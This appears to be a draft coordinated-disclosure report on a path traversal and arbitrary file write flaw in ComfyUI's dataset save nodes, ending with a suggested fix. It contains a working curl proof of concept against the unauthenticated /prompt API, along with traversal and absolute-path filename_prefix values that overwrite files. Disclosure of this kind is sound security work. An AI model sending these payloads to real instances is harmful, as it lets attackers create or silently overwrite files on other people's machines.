# Submission text (GHSA / Huntr) — copy-paste ready

> Fill in `<<researcher alias>>`, keep the rest as-is. GHSA first: https://github.com/comfyanonymous/ComfyUI/security/advisories/new — then Huntr if you also want the bounty/CVE via their program. Do not publish the PoC publicly until the maintainers ship a fix.

---

**Title:** Path traversal in `SaveImageDataSetToFolder[Text]` `filename_prefix` (overwrite mode) leads to arbitrary file write by unauthenticated users (CWE-22 / CWE-73)

**Severity (suggested):** Medium — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L ≈ 6.5 for the unauthenticated-API vector (≈5.0–5.5 via the workflow-file vector, UI required)

**Affected component:** `comfy_extras/nodes_dataset.py` → `save_images_to_folder()`, called by the built-in nodes `SaveImageDataSetToFolder` (line ~491) and `SaveImageTextDataSetToFolder` (line ~545)

**Affected versions:** current master (verified on v0.37.0, commit `b33e2b5`). Likely present since these nodes were introduced.

## Description

The built-in dataset save nodes accept a user-controlled `filename_prefix`. In `overwrite` mode the prefix is concatenated directly into the output filename with no sanitization and no containment check:

```python
# comfy_extras/nodes_dataset.py, save_images_to_folder()
if overwrite:
    filename = f"{prefix}_{idx:05d}.png"            # unsanitized user input
else:
    _, _, counter, _, resolved_prefix = folder_paths.get_save_image_path(prefix, output_dir)  # safe branch
    filename = f"{resolved_prefix}_{counter:05}_{idx:05d}.png"
filepath = os.path.join(output_dir, filename)       # no is_within_directory() check
img.save(filepath)                                  # and analogous open(caption_path, "w") for the .txt variant
```

The sibling `increment` mode routes through `get_save_image_path()` (which enforces `is_within_directory`), and `folder_name` goes through `secure_subfolder_path()` — the overwrite-mode `filename_prefix` is the one unguarded input in this file. Passing an absolute path (`/tmp/x`) or `../` segments escapes the output directory entirely and writes attacker-chosen files anywhere the process can write. On Windows, `\` also works as a separator, so the payload is cross-platform via `/`.

`SaveImageTextDataSetToFolder` additionally writes a `.txt` caption whose **entire content** is attacker-controlled (with the same traversal), and `overwrite` mode **silently truncates/overwrites** any pre-existing file matching the generated name. The node is **not deprecated** (only `is_experimental=True`); the PNG-only sibling is deprecated but server-side execution does not consult `is_deprecated` (`validate_prompt` only checks that `class_type` exists in `NODE_CLASS_MAPPINGS`, execution.py:1147).

## Impact on a typical local user (per your SECURITY.md threat model)

Two reachability paths, both pre-auth:

1. **Workflow-file vector (in scope per your policy):** a workflow `.json` containing `EmptyImage → SaveImageTextDataSetToFolder` with a traversal prefix runs silently on import/execution — no models, no GPU, built-in nodes only, no warning and no confirmation. Workflows are routinely shared in the community (Discord, forums, galleries). This matches the "clearest example" in your SECURITY.md: *a workflow file that a reasonable user might load and run, using only built-in nodes, that results in arbitrary file write outside expected directories*.
2. **API vector:** ComfyUI has no authentication on `/prompt`; anyone who can reach the instance (LAN, tunnel, shared host, per your "anyone with access is trusted" model) writes files with one POST.

**Constraints (honest scope):** filenames are forced to `<prefix>_NNNNN.png` / `<prefix>_NNNNN.txt`; the target's parent directory must already exist; `.png` content is a PIL-encoded image. So this is not direct RCE — it is a reliable integrity/availability primitive: arbitrary file creation and silent overwrite of pattern-matching files anywhere with process privileges (commonly root in container/cloud installs), usable as an escalation building block.

## Reproduction

Version: v0.37.0 (`b33e2b5`), manual install, Linux (Python 3.11), `--cpu` — no special flags. Start ComfyUI normally, then:

```bash
# 1) absolute-path write outside all ComfyUI directories (CWE-73)
curl -X POST http://127.0.0.1:8188/prompt -H 'Content-Type: application/json' -d '{
 "prompt": {
  "1": {"class_type":"EmptyImage","inputs":{"width":16,"height":16,"color":16711680,"batch_size":1}},
  "2": {"class_type":"SaveImageDataSetToFolder","inputs":{
      "images":["1",0],"folder_name":"dataset",
      "filename_prefix":"/tmp/poc_dir/arena_owned_abs","mode":"overwrite"}}}}'
# → /tmp/poc_dir/arena_owned_abs_00000.png

# 2) ../ traversal (CWE-22)
# filename_prefix: ../../../../../../../../tmp/poc_dir/arena_owned_traversal
# → /tmp/poc_dir/arena_owned_traversal_00000.png

# 3) fully controlled content + silent overwrite (text variant)
# node SaveImageTextDataSetToFolder, texts: "<attacker text>",
# filename_prefix: /tmp/poc_dir/important_config  overwrites
# existing /tmp/poc_dir/important_config_00000.txt with exactly <attacker text>, no warnings.
```

`EmptyImage` supplies the image input (no model/GPU needed). A ready-made minimal workflow and PoC script are attached (`malicious_workflow_demo.json` targets a benign path only).

## Suggested fix

Contain the final path in `save_images_to_folder()` (covers both nodes):

```python
filepath = os.path.join(output_dir, filename)
if not folder_paths.is_within_directory(output_dir, filepath):
    raise ValueError(f"Invalid filename_prefix {prefix!r}: resolves outside of {output_dir}")
```

(Defense-in-depth: reject `os.sep`/`..` in `filename_prefix` for these nodes.)

## Credit / reporter

`<<researcher alias>>` — security research, college program. Happy to coordinate disclosure and re-test the patch.

---

## Attachments to include
- `SECURITY_AUDIT_COMFYUI.md` (full audit, incl. verified-safe areas and the constraints/escalation appendix — it pre-answers triage questions)
- `malicious_workflow_demo.json` (benign-path repro)
- `fix_suggestion.diff`

## Expected labels
`CWE-22`, `CWE-73`, path traversal, arbitrary file write, pre-auth. CVE assignment via the maintainers/Huntr per the program.
